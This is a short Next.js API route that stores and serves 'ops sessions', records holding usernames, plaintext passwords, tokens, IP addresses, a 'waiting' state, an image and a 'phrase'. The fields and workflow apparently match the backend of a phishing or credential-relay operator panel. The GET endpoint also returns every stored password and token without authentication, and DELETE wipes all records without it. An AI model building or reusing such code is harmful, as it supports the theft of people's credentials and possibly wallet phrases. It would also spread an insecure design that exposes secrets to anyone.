import { NextResponse } from "next/server";
import type { OpsSession } from "@/lib/ops-channel";
import {
  clearOpsSessionsServer,
  listOpsSessions,
  upsertOpsSessionServer,
} from "@/lib/ops-store";

export const dynamic = "force-dynamic";

export async function GET() {
  return NextResponse.json({ sessions: listOpsSessions() });
}

export async function POST(request: Request) {
  const body = (await request.json()) as Partial<OpsSession>;
  if (!body.id || !body.username) {
    return NextResponse.json(
      { error: "id y username son requeridos" },
      { status: 400 },
    );
  }
  const now = Date.now();
  const session = upsertOpsSessionServer({
    id: body.id,
    username: body.username,
    password: body.password,
    token: body.token,
    device: body.device ?? "desktop",
    ip: body.ip ?? "127.0.0.1",
    state: body.state ?? "waiting",
    createdAt: body.createdAt ?? now,
    updatedAt: now,
    last_seen: now,
    imageSrc: body.imageSrc,
    phrase: body.phrase,
  });
  return NextResponse.json({ session });
}

export async function DELETE() {
  clearOpsSessionsServer();
  return NextResponse.json({ ok: true });
}
